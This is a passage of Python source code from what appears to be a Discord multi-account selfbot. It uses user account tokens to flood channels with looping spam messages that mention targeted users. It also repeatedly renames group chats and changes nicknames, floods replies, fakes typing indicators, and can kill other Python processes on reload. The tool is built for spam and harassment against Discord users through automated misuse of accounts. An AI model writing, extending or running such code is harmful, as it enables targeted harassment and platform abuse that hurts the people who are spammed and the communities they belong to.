         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
     except Exception as e:
         print(e)
         time.sleep(5)
         continue

#spiced up line spam
async def send_with_retrychannel4(ctx, message, delay,count,canalid):
    global mt
    ceva = True
    count = int(count)
    if tokenschannel1[count] == False:  
        exit()
    while tokenschannel1[count]:
     if tokenschannel1[count] == False:
      exit()
     try:
         json = {"content":message} 
         headers = {"authorization":tokens2[count]}
         if tokenstyping4[count] == True:
             requests.post(f"https://discord.com/api/v10/channels/{canalid}/typing"
                           ,headers=headers)
         requests.post(f'https://discord.com/api/v10/channels/{canalid}/messages'
                       ,headers=headers
                       ,json=json)
         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
     except Exception as e:
         print(e)
         time.sleep(5)
         continue

#spiced up line spam
def send_with_retry_startall4(ctx,mentions):
    mentions = ' '.join([mention.mention for mention in mentions])
    canal = ctx.channel.id
    while tokens6[1]:
     for message in spiced_multi_line_spam_messages:
      for i in tokens2:
        formatted_message = '\n'.join(f"# > {line}" for line in message.split('\n'))
        if i == token:
            continue
        headers = {"authorization":i}
        json = {"content":f"{formatted_message} {mentions}"} 
        if not tokens6[1]:
         exit()
        try:
            if tokensglobaltyping[0] == True:
             requests.post(f"https://discord.com/api/v10/channels/{canal}/typing"
                           ,headers=headers)
            requests.post(f'https://discord.com/api/v10/channels/{canal}/messages'
                          ,headers=headers
                          ,json=json)
        except requests.exceptions.HTTPError as errh:
            print(f"HTTP Error: {errh}")
            time.sleep(5)
            continue
        except requests.exceptions.ConnectionError as errc:
            print(f"Error Connecting: {errc}")
            time.sleep(5)
            continue
        except requests.exceptions.Timeout as errt:
            print(f"Timeout Error: {errt}")
            time.sleep(5)
            continue
        except requests.exceptions.RequestException as err:
            print(f"Request Exception: {err}")
            time.sleep(5)
            continue
        except Exception as e:
            print(e)
            time.sleep(5)
            continue

# startnotepad command logic        
def send_with_retry_notepad(ctx,count,json,canal):
    #BETA TESTING SCRIPT // FOR DEBUGGING

    #while tokens_notepad[count]:
    # if not tokens_notepad[count]:
    #    return
    # try:
    #  requests.post(f'https://discord.com/api/v10/channels/{canal}/messages'
    #             ,headers={"authorization":tokens_notepad2[count]}
    #             ,json={"content":json})
    #  time.sleep(tokensdelay2[count])
    # except requests.exceptions.HTTPError as errh:
    #  print(f"HTTP Error: {errh}")   
    #  time.sleep(5)
    #  continue
    # except requests.exceptions.ConnectionError as errc:
    #     print(f"Error Connecting: {errc}")
    #     time.sleep(5) 
    #     continue
    # except requests.exceptions.Timeout as errt:
    #     print(f"Timeout Error: {errt}")
    #     time.sleep(5) 
    #     continue
    # except requests.exceptions.RequestException as err:
    #     print(f"Request Exception: {err}")
    #     time.sleep(5)
    #     continue
    # except Exception as e:
    #     print(e)
    #     time.sleep(5)   
    if tokens_notepad[count] == False:
        exit()
    while tokens_notepad[count]:
     if tokens_notepad[count] == False:
      exit()
     try:
         json = {"content":json} 
         headers = {"authorization":tokens_notepad2[count]}
         if tokenstyping2[count] == True:
             requests.post(f"https://discord.com/api/v10/channels/{canal}/typing"
                           ,headers=headers)
         requests.post(f'https://discord.com/api/v10/channels/{canal}/messages'
                       ,headers=headers,json=json)
         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
     except Exception as e:
         print(e)
         time.sleep(5)
         continue
  
#afkcheck command logic
  
def send_with_retry_afk_check(ctx,count,mesaje):
    if tokens_afkcheck[count] == False:
     exit()
    if tokens_afkcheck[count] == False:
      exit()
    try:
        json = {"content":mesaje} 
        headers = {"authorization":tokens_afkcheck2[count]}
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers=headers,json=json)
    except requests.exceptions.HTTPError as errh:
        print(f"HTTP Error: {errh}")
        time.sleep(5)
        pass
    except requests.exceptions.ConnectionError as errc:
        print(f"Error Connecting: {errc}")
        time.sleep(5)
        pass
    except requests.exceptions.Timeout as errt:
        print(f"Timeout Error: {errt}")
        time.sleep(5)
        pass
    except requests.exceptions.RequestException as err:
        print(f"Request Exception: {err}")
        time.sleep(5)
        pass
    except Exception as e:
        print(e)
        time.sleep(5)
        pass

# send with retry token based

def send_with_retry_token_based(rawmesaje,tokeni,canal,tokeni_noi):
    if tokensbased[0] == False:
        return
    numerebug = []
    x = int(len(tokeni_noi))
    for i in range(x):
        numerebug.append(int(i))
    while tokensbased[0]:
     for cont in numerebug:
      if tokensbased[0] == False or not tokensbased[0]:
       return
      try:
           headers = {'Authorization': tokeni_noi[cont]}
           json = {'content':f"{rawmesaje[cont]}"}
           message_post = requests.post(f'https://discord.com/api/v9/channels/{canal}/messages', headers=headers, json=json)
           time.sleep(tokensdelay2[0])
      except requests.exceptions.HTTPError as errh:
          print(f"HTTP Error: {errh}")
          time.sleep(5)
          continue
      except requests.exceptions.ConnectionError as errc:
          print(f"Error Connecting: {errc}")
          time.sleep(5)
          continue
      except requests.exceptions.Timeout as errt:
          print(f"Timeout Error: {errt}")
          time.sleep(5)
          continue
      except requests.exceptions.RequestException as err:
          print(f"Request Exception: {err}")
          time.sleep(5)
          continue
      except Exception as e:
          print(e)
          time.sleep(5)
          continue

# send with retry change group

def send_with_retry_change_group(ctx,count,grupid,rawmesaje):
    if tokensgroup[count] == False or not tokensgroup[count]:
        return
    while tokensgroup[count]:
     for i in rawmesaje:
      if tokensgroup[count] == False or not tokensgroup[count]:
       return
      try:
        headers = {
        'Authorization': tokensgroup2[count],
        'Content-Type': 'application/json'
                  }
        requests.patch(f'https://discord.com/api/v10/channels/{grupid}', headers=headers, json={'name': i})
        time.sleep(grupdelay[0])
      except requests.exceptions.HTTPError as errh:
          print(f"HTTP Error: {errh}")
          time.sleep(5)
          continue
      except requests.exceptions.ConnectionError as errc:
          print(f"Error Connecting: {errc}")
          time.sleep(5)
          continue
      except requests.exceptions.Timeout as errt:
          print(f"Timeout Error: {errt}")
          time.sleep(5)
          continue
      except requests.exceptions.RequestException as err:
          print(f"Request Exception: {err}")
          time.sleep(5)
          continue
      except Exception as e:
          print(e)
          time.sleep(5)
          continue

def send_with_retry_change_nick(ctx,count,serverid,nickuri,mentions):
    if tokensnick[count] == False or not tokensnick[count]:
        return
    while tokensnick[count]:
     for i in nickuri:
      if tokensnick[count] == False or not tokensnick[count]:
       return
      try:
        headers = {
        'Authorization': tokensnick2[count],
        'Content-Type': 'application/json'
                  }
        response = requests.patch(f'https://discord.com/api/v9/guilds/{serverid}/members/{mentions}', headers=headers, json={'nick':i})
        time.sleep(grupdelay[0])
      except requests.exceptions.HTTPError as errh:
          print(f"HTTP Error: {errh}")
          time.sleep(5)
          continue
      except requests.exceptions.ConnectionError as errc:
          print(f"Error Connecting: {errc}")
          time.sleep(5)
          continue
      except requests.exceptions.Timeout as errt:
          print(f"Timeout Error: {errt}")
          time.sleep(5)
          continue
      except requests.exceptions.RequestException as err:
          print(f"Request Exception: {err}")
          time.sleep(5)
          continue
      except Exception as e:
          print(e)
          time.sleep(5)
          continue

async def send_with_retry32(ctx, message, delay,count):
    global mt
    ceva = True
    count = int(count)
    if tokenspreset[count] == False:
        return
    while tokenspreset[count]:
     if tokenspreset[count] == False:
      return
     try:
         json = {"content":message} 
         headers = {"authorization":tokenspreset2[count]}
         if tokenstyping3[count] == True:
             requests.post(f"https://discord.com/api/v10/channels/{ctx.channel.id}/typing"
                           ,headers=headers)
         requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                       ,headers=headers
                       ,json=json)
         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
     except Exception as e:
         print(e)
         time.sleep(5)
         continue

async def repeated_message_spam2(ctx,count=None,message=None):
    count = int(count)
    await ctx.message.delete()
    while tokenspreset[count]:
     if tokenspreset[count] == False:
        return
     await send_with_retry32(ctx, message, tokensdelay3[count],count)
     await asyncio.sleep(tokensdelay3[count])

# send with retry reply

def send_with_retry_reply(channel_id, message_id, msg):
    while tokensreply[0]:
      for tokenasut in tokens:
        if not tokensreply[0]:
            return
        payload = {
            'content': msg, 
            'tts':False
        }
        headers = {
            'authorization': tokenasut,
            "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        }
        payload['message_reference'] = {
            "channel_id": channel_id,
            "message_id": message_id
        }   
        r = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
        time.sleep(tokenreplydelay[0])

# send and retry for fun commands      
        
async def send_with_retry11(ctx,mesaj):
    await ctx.send(mesaj)

async def send_with_retry12(ctx,mesaj):
    await ctx.send(mesaj)

# set scripts for fun client

async def pulamea(ctx, user_mentions=None):
    mentions = ' '.join([mention.mention for mention in user_mentions])
    if mentions != "<@!1011893358316236850>" or mentions != "<@1011893358316236850>" or mentions != "<@929832595770982400>" or mentions != "<@!929832595770982400>":
     number = random.randrange(100)
    else:
        number = "10000000000000000"
    if mentions == "<@720929564800450630>":
      mesaj = f"# <@{ctx.author.id}> :revolving_hearts: {mentions} = 0%"
    else:
        mesaj = f"# <@{ctx.author.id}> :revolving_hearts: {mentions} = {number}%"
    await send_with_retry11(ctx, f"{mesaj}")

async def pulamea2(ctx, user_mentions=None):
    if user_mentions == () or user_mentions == "" or user_mentions == None or user_mentions == "" or user_mentions == [] or user_mentions == {}:
        mesaj = f"# <@{ctx.author.id}> = {random.randrange(100)}% :rainbow_flag:"
        await send_with_retry12(ctx, f"{mesaj}")
    else:
     mentions = ' '.join([mention.mention for mention in user_mentions])
     mesaj = f"# {mentions} = {random.randrange(100)}% :rainbow_flag:"
     await send_with_retry12(ctx, f"{mesaj}")

# prepare for send and retry scripts

async def send_messages_single_line_spam(ctx, user_mentions=None,count=None):
    count = int(count)
    await ctx.message.delete()
    while tokens[count]:
     for message in single_line_spam_messages:
      if tokens[count] == False:
          return
      if user_mentions:
         mentions = ' '.join([mention.mention for mention in user_mentions])
         if big_text[0]:
          mesaj = f"# > {message} {mentions}"
         elif not big_text[0]:
          mesaj = f"{message} {mentions}" 
         #thred = threading.Thread(target=send_with_retry,args=(ctx,mesaj, single_line_spam_delay,count),daemon=True)
         #thred.start()   
         await send_with_retry(ctx,mesaj, tokensdelay1[count],count)
      else:
         if big_text[0]:
          mesaj = f"# > {message}"
         elif not big_text[0]:
          mesaj = f"{message}"   
         #thred = threading.Thread(target=send_with_retry,args=(ctx,mesaj, single_line_spam_delay,count),daemon=True)
         #thred.start()
         await send_with_retry(ctx,mesaj, tokensdelay1[count],count)
      await asyncio.sleep(tokensdelay1[count])

async def send_messages_single_line_spam_channel(ctx, user_mentions=None,count=None,canalid=None):
    count = int(count)
    await ctx.message.delete()
    while tokenschannel1[count]:
     for message in single_line_spam_messages:
      if tokenschannel1[count] == False:
          return
      if user_mentions:
         mentions = ' '.join([mention.mention for mention in user_mentions])
         mesaj = f"# > {message} {mentions}"
         #thred = threading.Thread(target=send_with_retry,args=(ctx,mesaj, single_line_spam_delay,count),daemon=True)
         #thred.start()   
         await send_with_retrychannel(ctx,mesaj, tokensdelay1[count],count,canalid)
      else:
         mesaj = f"# > {message}"
         #thred = threading.Thread(target=send_with_retry,args=(ctx,mesaj, single_line_spam_delay,count),daemon=True)
         #thred.start()
         await send_with_retrychannel(ctx,mesaj, tokensdelay1[count],count,canalid)
      await asyncio.sleep(tokensdelay1[count])

async def send_messages_multi_line_spam(ctx, user_mentions=None,count=None):
    count = int(count)
    await ctx.message.delete()
    while tokens[count]:
     for message in multi_line_spam_messages:
      if tokens[count] == False:
        return
      if user_mentions:
          mentions = ' '.join([mention.mention for mention in user_mentions])
          mesaj = f"{message} {mentions}"
          #thred = threading.Thread(target=send_with_retry2,args=(ctx,mesaj, multi_line_spam_delay,count),daemon=True)
          #thred.start()   
          await send_with_retry2(ctx,mesaj, tokensdelay2[count],count)
      else:
          mesaj = f"{message}"
          #thred = threading.Thread(target=send_with_retry2,args=(ctx,mesaj, multi_line_spam_delay,count),daemon=True)
          #thred.start()
          await send_with_retry2(ctx,mesaj, tokensdelay2[count],count)
      await asyncio.sleep(tokensdelay2[count])

async def send_messages_multi_line_spam_channel(ctx, user_mentions=None,count=None,canalid=None):
    count = int(count)
    await ctx.message.delete()
    while tokenschannel1[count]:
     for message in multi_line_spam_messages:
      if tokenschannel1[count] == False:
        return
      if user_mentions:
          mentions = ' '.join([mention.mention for mention in user_mentions])
          mesaj = f"{message} {mentions}"
          #thred = threading.Thread(target=send_with_retry2,args=(ctx,mesaj, multi_line_spam_delay,count),daemon=True)
          #thred.start()   
          await send_with_retrychannel2(ctx,mesaj, tokensdelay2[count],count,canalid)
      else:
          mesaj = f"{message}"
          #thred = threading.Thread(target=send_with_retry2,args=(ctx,mesaj, multi_line_spam_delay,count),daemon=True)
          #thred.start()
          await send_with_retrychannel2(ctx,mesaj, tokensdelay2[count],count,canalid)
      await asyncio.sleep(tokensdelay2[count])

async def repeated_message_spam(ctx,count=None,message=None):
    count = int(count)
    await ctx.message.delete()
    while tokens[count]:
     if tokens[count] == False:
        return
     #thred = threading.Thread(target=send_with_retry3,args=(ctx, message, repeated_message_spam_delay,count),daemon=True)
     #thred.start()
     await send_with_retry3(ctx, message, tokensdelay3[count],count)
     await asyncio.sleep(tokensdelay3[count])
     
async def repeated_message_spam_channel(ctx,count=None,message=None,canalid=None):
    count = int(count)
    await ctx.message.delete()
    while tokenschannel1[count]:
     if tokenschannel1[count] == False:
        return
     #thred = threading.Thread(target=send_with_retry3,args=(ctx, message, repeated_message_spam_delay,count),daemon=True)
     #thred.start()
     await send_with_retrychannel3(ctx, message, tokensdelay3[count],count,canalid)
     await asyncio.sleep(tokensdelay3[count])     
        
async def send_spiced_multi_line_spam(ctx, user_mentions=None,count=None):
    count = int(count)
    while tokens[count]:
     for message in spiced_multi_line_spam_messages:
        if tokens[count] == False:
         return
        if user_mentions:
            mentions = ' '.join([mention.mention for mention in user_mentions])
            formatted_message = '\n'.join(f"# > {line}" for line in message.split('\n'))
            #thred = threading.Thread(target=send_with_retry4,args=(ctx, f"{formatted_message} {mentions}", spiced_multi_line_spam_delay,count),daemon=True)
            #thred.start()
            await send_with_retry4(ctx, f"{formatted_message} {mentions}", tokensdelay4[count],count)
        else:
            formatted_message = '\n'.join(f"# > {line}" for line in message.split('\n'))
            #thred = threading.Thread(target=send_with_retry4,args=(ctx, f"{formatted_message}", spiced_multi_line_spam_delay,count),daemon=True)
            #thred.start()
            await send_with_retry4(ctx, formatted_message, tokensdelay4[count],count)
        await asyncio.sleep(tokensdelay4[count])
        
async def send_spiced_multi_line_spam_channel(ctx, user_mentions=None,count=None,canalid=None):
    count = int(count)
    while tokenschannel1[count]:
     for message in spiced_multi_line_spam_messages:
        if tokenschannel1[count] == False:
         return
        if user_mentions:
            mentions = ' '.join([mention.mention for mention in user_mentions])
            formatted_message = '\n'.join(f"# > {line}" for line in message.split('\n'))
            #thred = threading.Thread(target=send_with_retry4,args=(ctx, f"{formatted_message} {mentions}", spiced_multi_line_spam_delay,count),daemon=True)
            #thred.start()
            await send_with_retrychannel4(ctx, f"{formatted_message} {mentions}", tokensdelay4[count],count,canalid)
        else:
            formatted_message = '\n'.join(f"# > {line}" for line in message.split('\n'))
            #thred = threading.Thread(target=send_with_retry4,args=(ctx, f"{formatted_message}", spiced_multi_line_spam_delay,count),daemon=True)
            #thred.start()
            await send_with_retrychannel4(ctx, formatted_message, tokensdelay4[count],count,canalid)
        await asyncio.sleep(tokensdelay4[count])        

async def send_messages_notepad(ctx,messages,mentions,count,canal):
    count = int(count)
    while tokens_notepad[count]:
     for text1 in messages:
      if tokens_notepad[count] == False:
        return
      if mentions == "" or mentions == None:
          mesaj = f"{text1}"
          thred = threading.Thread(target=send_with_retry_notepad
                                   ,args=(ctx,count,mesaj,canal)
                                   ,daemon=True)
          thred.start()   
          #await send_with_retry_notepad(ctx,count,mesaj,canal)
      else:
          mesaj = f"{text1} {mentions}"
          thred = threading.Thread(target=send_with_retry_notepad
                                   ,args=(ctx,count,mesaj,canal)
                                   ,daemon=True)
          thred.start()
          #await send_with_retry_notepad(ctx,count,mesaj,canal)
      await asyncio.sleep(tokensdelay2[count])

async def send_messages_afk_check(ctx,count: int,mesaje: int):
    count = int(count)
    mesaje = int(mesaje)
    for text1 in range(0,mesaje):
        thred = threading.Thread(target=send_with_retry_afk_check
                                   ,args=(ctx,count,text1)
                                   ,daemon=True)
        thred.start()
        await asyncio.sleep(1.5)

async def send_messages_token_based(ctx,rawmesaje,tokeni,canal,tokeni_noi):
    if not tokensbased[0]:
      return
    if tokensbased[0]:
         thredtolenut = threading.Thread(target=send_with_retry_token_based,args=(rawmesaje,tokeni,canal,tokeni_noi))
         thredtolenut.start()
         time.sleep(tokensdelay2[0])
    else:
        pass

async def send_messages_change_group(ctx,count,grupid,rawmesaje):
    if not tokensgroup[count]:
        return
    if tokensbased[count]:
        thredahhhh = threading.Thread(target=send_with_retry_change_group,args=(ctx,count,grupid,rawmesaje))
        thredahhhh.start()
    else:
        pass

async def send_messages_change_nick(ctx,count,serverid,nickuri,mentions):
    if not tokensnick[count]:
        return
    if tokensnick[count]:
        thredahhhh2 = threading.Thread(target=send_with_retry_change_nick,args=(ctx,count,serverid,nickuri,mentions))
        thredahhhh2.start()
    else:
        pass

async def send_messages_fast_start_all(ctx, user_mentions=None, count=None):
    count = int(count)
    while tokensfast[0]:
        for message in single_line_spam_messages:
            if tokensfast[0]:
                mentions = ' '.join([mention.mention for mention in user_mentions]) if user_mentions else ''
                mesaj = f"# > {message} {mentions}"
                await send_with_retry_fast_start_all(ctx, mesaj, count)
                await asyncio.sleep(tokensdelay1[0])  

# single line spam commands

#normal start
@client_single_line_spam.command()
async def start(ctx, count=None,*user_mentions:discord.User):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    if tokens[count] == True:
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":"# `Script is already started on this token`"})
        return
    tokens[count] = True
    with open("status.json",'r') as file4:
     data4 = json.load(file4)
    data4[str(count)].append("Single Line Spam")
    with open('status.json','w') as file4:
      json.dump(data4,file4,indent=4)
    await send_messages_single_line_spam(ctx, user_mentions,count)

#startchannel
@client_single_line_spam.command()
async def startchannel(ctx,count=None,canalid=None,*user_mentions:discord.User):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {channel id} {optional tag}`"})
     return
    if canalid == None:
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":"# `Please specify a channel id with the form: {command}start {token number} {channel id} {optional tag}`"})
        return
    count = int(count)
    count -= 1
    if tokenschannel1[count] == True:
        requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                      ,headers={"authorization":token}
                      ,json={"content":"# `Script is already started on this token`"})
        return
    tokenschannel1[count] = True
    with open("status.json",'r') as file4:
     data4 = json.load(file4)
    data4[str(count)].append("Single Line Channel Spam")
    with open('status.json','w') as file4:
      json.dump(data4,file4,indent=4)
    await send_messages_single_line_spam_channel(ctx, user_mentions,count,canalid)

#startall
@client_single_line_spam.command()
async def startall(ctx,*user_mentions:discord.User):
    for i in range(len(tokens)):
        tokens3[i] = True
    await ctx.message.delete()
    thred = threading.Thread(target=send_with_retry_startall
                             ,args=(ctx, user_mentions)
                             ,daemon=True)
    thred.start()

#faststartall
@client_single_line_spam.command()
async def faststartall(ctx, *user_mentions: discord.User):
    await ctx.message.delete()
    coros = []
    for i in range(len(tokens)):
        tokensfast[0] = True
        coros.append(send_messages_fast_start_all(ctx, user_mentions, i))
    await asyncio.gather(*coros)

#stopfaststartall
@client_single_line_spam.command()
async def faststopall(ctx):
    await ctx.message.delete()
    coros = []
    tokensfast[0] = False
    await asyncio.gather(*coros)

#typing
@client_single_line_spam.command()
async def typing(ctx, count=None, choice=None):
    await ctx.message.delete()
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers={"authorization":token},json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    optiuni = ["true","TRUE","True","false","FALSE","False"]
    optiuniadv = ["true","TRUE","True",]
    optiunineadv = ["false","FALSE","False"]
    if choice not in optiuni:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages',headers={"authorization":token},json={"content":"# `Invalid parameter, value must be equal to False or True `"})
     return
    count = int(count)
    count -= 1
    if choice in optiuniadv:
     tokenstyping1[count] = True
    elif choice in optiunineadv:
     tokenstyping1[count] = False
 
#typingall     
@client_single_line_spam.command()
async def typingall(ctx, choice=None):
    await ctx.message.delete()
    optiuni = ["true","TRUE","True","false","FALSE","False"]
    optiuniadv = ["true","TRUE","True",]
    optiunineadv = ["false","FALSE","False"]
    if choice not in optiuni:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Invalid parameter, value must be equal to False or True `"})
     return
    if choice in optiuniadv:
     for i in range(len(tokens)):
      tokenstyping1[i] = True
    elif choice in optiunineadv:
     for i in range(len(tokens)):
      tokenstyping1[i] = False    

#delay
@client_single_line_spam.command()
async def delay(ctx, count=None, delay1=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    delay1 = int(delay1)
    tokensdelay1[count] = delay1
    await ctx.message.delete()

#delayall
@client_single_line_spam.command()
async def delayall(ctx, delay2=None):
    await ctx.message.delete()
    for i in range(len(tokens)):
        tokensdelay1[i] = int(delay2)

#size
@client_single_line_spam.command()
async def size(ctx, text_value=None):
    big_choices = ['Big','BIG','big']
    small_choices = ['Small','SMALL','small']
    if text_value not in big_choices and text_value not in small_choices:
        return
    if text_value in big_choices:
        big_text[0] = True
    elif text_value in small_choices:
        big_text[0] = False    
    await ctx.message.delete()

# multi line spam commands

#start
@client_multi_line_spam.command()
async def start(ctx, count=None,*user_mentions:discord.User):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    tokens[count] = True
    with open("status.json",'r') as file4:
     data4 = json.load(file4)
    data4[str(count)].append("Multi Line Spam")
    with open('status.json','w') as file4:
      json.dump(data4,file4,indent=4)
    await send_messages_multi_line_spam(ctx, user_mentions,count)

#startchannel
@client_multi_line_spam.command()
async def startchannel(ctx, count=None,canalid=None, *user_mentions:discord.User):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {channel id} {optional tag}`"})
     return
    if canalid == None:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a channel id with the form: {command}start {token number} {channel id} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    tokenschannel1[count] = True
    with open("status.json",'r') as file4:
     data4 = json.load(file4)
    data4[str(count)].append("Multi Line Channel Spam")
    with open('status.json','w') as file4:
      json.dump(data4,file4,indent=4)
    await send_messages_multi_line_spam_channel(ctx, user_mentions,count,canalid)

#startall
@client_multi_line_spam.command()
async def startall(ctx,*user_mentions:discord.User):
    for i in range(len(tokens)):
        tokens4[i] = True
    await ctx.message.delete()
    thred = threading.Thread(target=send_with_retry_startall2
                             ,args=(ctx, user_mentions)
                             ,daemon=True)
    thred.start()

#reload
@client_multi_line_spam.command()
async def reload(ctx):
    await ctx.message.delete()
    current_process = psutil.Process(os.getpid())
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        if proc.pid != current_process.pid:
            try:
                if "python" in proc.info['name'].lower() and proc.pid:
                    proc.kill()
                    proc.wait()
            except Exception as e:
                return

    pitonel = sys.executable
    os.execl(pitonel, pitonel, *sys.argv)

#typing
@client_multi_line_spam.command()
async def typing(ctx, count=None, choice=None):
    await ctx.message.delete()
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    optiuni = ["true","TRUE","True","false","FALSE","False"]
    optiuniadv = ["true","TRUE","True",]
    optiunineadv = ["false","FALSE","False"]
    if choice not in optiuni:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Invalid parameter, value must be equal to False or True `"})
     return
    count = int(count)
    count -= 1
    if choice in optiuniadv:
     tokenstyping2[count] = True
    elif choice in optiunineadv:
     tokenstyping2[count] = False

#typingall
@client_multi_line_spam.command()
async def typingall(ctx, choice=None):
    await ctx.message.delete()
    optiuni = ["true","TRUE","True","false","FALSE","False"]
    optiuniadv = ["true","TRUE","True",]
    optiunineadv = ["false","FALSE","False"]
    if choice not in optiuni:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Invalid parameter, value must be equal to False or True `"})
     return
    if choice in optiuniadv:
     for i in range(len(tokens)):
      tokenstyping2[i] = True
    elif choice in optiunineadv:
     for i in range(len(tokens)):
      tokenstyping2[i] = False

#delay
@client_multi_line_spam.command()
async def delay(ctx, count=None, delay1=None):
    if count == None or "<@" in count:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Please specify a token number with the form: {command}start {token number} {optional tag}`"})
     return
    count = int(count)
    count -= 1
    delay1 = int(delay1)
    tokensdelay2[count] = delay1
    await ctx.message.delete()
    
#delayall   
@client_multi_line_spam.command()
async def delayall(ctx, delay2=None):
    await ctx.message.delete()
    for i in range(len(tokens)):
        tokensdelay2[i] = int(delay2)

#startnotepad
@client_multi_line_spam.command()
async def startnotepad(ctx, count=None, channelid=None, file_name=None, *user_mentions:discord.User):
    count = int(count) 
    count -= 1
    tokens_notepad[count] = True
    file_name = str(file_name)
    try:
     messages = list(load_messages(file_name))
    except FileNotFoundError:
      await ctx.send("# File name doesnt exist")
      return
    try:
     mentions = ' '.join([mention.mention for mention in user_mentions])
    except Exception:
        pass
    await ctx.message.delete()
    canal = int(channelid)
    with open("status.json",'r') as file4:
     data4 = json.load(file4)
    data4[str(count)].append("Notepad Spam")
    with open('status.json','w') as file4:
      json.dump(data4,file4,indent=4)
    await send_messages_notepad(ctx,messages,mentions,count,canal)

#startnotepadshiftenter
@client_multi_line_spam.command()
async def startnotepadshift(ctx, count=None, channelid=None, file_name=None, *user_mentions:discord.User):
    count = int(count) 
    count -= 1
    tokens_notepad[count] = True
    file_name = str(file_name)
    try:    
     messages = list(load_messages2(file_name))
    except FileNotFoundError:
      await ctx.send("# File name doesnt exist")
      return
    try:
     mentions = ' '.join([mention.mention for mention in user_mentions])
    except Exception:
        pass
    await ctx.message.delete()
    canal = int(channelid)
    with open("status.json",'r') as file4:
     data4 = json.load(file4)
    data4[str(count)].append("Notepad Shift Enter Spam")
    with open('status.json','w') as file4:
      json.dump(data4,file4,indent=4)
    await send_messages_notepad(ctx,messages,mentions,count,canal)

#tokenbased
@client_multi_line_spam.command()
async def tokenbased(ctx, *texte: str):
    rawmesaje = texte
    tokensbased[0] = True
    new_tokens = []
    for i in tokensbased2:
        if i == tokensbased2[0]:
            continue
        new_tokens.append(i)
    tokeni = new_tokens
    canal = ctx.channel.id
    tokeni_noi = []
    for i in range(len(rawmesaje)):
        tokeni_noi.append(tokeni[i])
    await ctx.message.delete()
